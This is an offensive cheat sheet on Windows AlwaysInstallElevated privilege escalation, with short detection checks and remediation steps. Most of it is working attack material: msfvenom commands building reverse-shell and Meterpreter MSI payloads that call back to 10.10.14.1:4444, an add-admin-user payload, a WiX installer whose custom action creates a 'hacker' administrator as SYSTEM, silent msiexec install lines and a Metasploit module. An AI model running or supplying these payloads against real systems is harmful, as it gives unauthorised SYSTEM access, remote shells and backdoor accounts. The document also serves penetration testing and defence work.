# AlwaysInstallElevated — MSI Privilege Escalation

When both HKLM and HKCU `AlwaysInstallElevated` registry keys are set to 1, any user can install MSI packages with SYSTEM privileges.

**MITRE ATT&CK**: T1548.002  
**Severity**: CRITICAL (user → SYSTEM)

## Detection

```cmd
:: Both must be set to 1 for exploitation
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```powershell
# PowerShell check
$hklm = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue).AlwaysInstallElevated
$hkcu = (Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue).AlwaysInstallElevated
if ($hklm -eq 1 -and $hkcu -eq 1) { Write-Output "[!] VULNERABLE - AlwaysInstallElevated is enabled" }
```

## Exploitation — msfvenom MSI

```bash
# Reverse shell MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f msi -o evil.msi

# Add admin user MSI
msfvenom -p windows/adduser USER=hacker PASS=Password123! -f msi -o adduser.msi

# Meterpreter MSI
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f msi -o meterpreter.msi
```

## Exploitation — Manual MSI (WiX Toolset)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" UpgradeCode="12345678-1234-1234-1234-123456789ABC"
           Name="Payload" Version="1.0" Manufacturer="Test" Language="1033">
    <Package InstallerVersion="200" Compressed="yes" InstallScope="perMachine"/>
    <MediaTemplate/>
    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="ProgramFilesFolder">
        <Directory Id="INSTALLFOLDER" Name="Payload"/>
      </Directory>
    </Directory>
    <Feature Id="ProductFeature" Title="Main">
      <ComponentGroupRef Id="ProductComponents"/>
    </Feature>
    <!-- Runs as SYSTEM during install -->
    <CustomAction Id="RunPayload" Directory="TARGETDIR"
                  ExeCommand='cmd.exe /c "net user hacker Pass123! /add &amp; net localgroup Administrators hacker /add"'
                  Execute="deferred" Impersonate="no" Return="ignore"/>
    <InstallExecuteSequence>
      <Custom Action="RunPayload" After="InstallFiles"/>
    </InstallExecuteSequence>
  </Product>
</Wix>
```

## Install the Malicious MSI

```cmd
:: Silent install (no GUI)
msiexec /quiet /qn /i evil.msi

:: Install with logging
msiexec /quiet /qn /i evil.msi /l*v install.log

:: Alternative: double-click the MSI file
```

## Metasploit Module

```
use exploit/windows/local/always_install_elevated
set SESSION 1
set LHOST 10.10.14.1
run
```

## Remediation

```cmd
:: Disable AlwaysInstallElevated
reg delete HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /f
reg delete HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /f
```

Or via Group Policy: Computer Configuration → Administrative Templates → Windows Components → Windows Installer → "Always install with elevated privileges" → Disabled
